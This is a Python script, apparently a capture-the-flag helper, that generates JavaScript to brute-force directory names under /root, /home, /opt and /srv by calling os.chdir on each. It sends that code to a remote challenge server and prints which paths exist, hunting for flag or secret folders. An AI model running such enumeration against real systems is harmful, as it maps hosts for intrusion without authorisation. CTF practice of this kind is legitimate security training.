import json
import socket

HOST, PORT = 'ctf.vulnbydefault.com', 38871

name_words = [
    'ctf','challenge','chall','pwn','jitstream','jit','stream','maglev','v8','exploit',
    'task','prob','problem','app','src','server','files','data','secret','hidden',
    'flag','flags','work','workspace','tmp','bin','opt','run','home','user','test',
    'code','project','projects','sandbox','instance','deploy','dist','build','out',
    'var','www','www-data','html','static','config','conf','root','admin','ubuntu',
    'player','guest','service','services','ctfuser','pwner','reverse','misc','web',
    'crypto','forensics','notes'
]

prefixes = ['', '.', '_', '']
suffixes = ['', '1', '2', '_dir', '-dir', '_files', '-files', '_data', '-data']

paths = set()
for w in name_words:
    for pre in prefixes:
        for suf in suffixes:
            n = f"{pre}{w}{suf}"
            paths.add('/root/' + n)
            paths.add('/home/' + n)
            paths.add('/opt/' + n)
            paths.add('/srv/' + n)

js = "const paths=" + json.dumps(sorted(paths)) + ";\n"
js += "for (const p of paths){try{os.chdir(p);print('DIR '+p);}catch(e){}}\n"

s = socket.create_connection((HOST, PORT), timeout=25)
s.recv(4096)
s.sendall((str(len(js)) + "\n").encode())
s.recv(4096)
s.sendall(js.encode())
s.shutdown(socket.SHUT_WR)

out = b''
while True:
    d = s.recv(262144)
    if not d:
        break
    out += d

print(out.decode('latin1', errors='replace'))
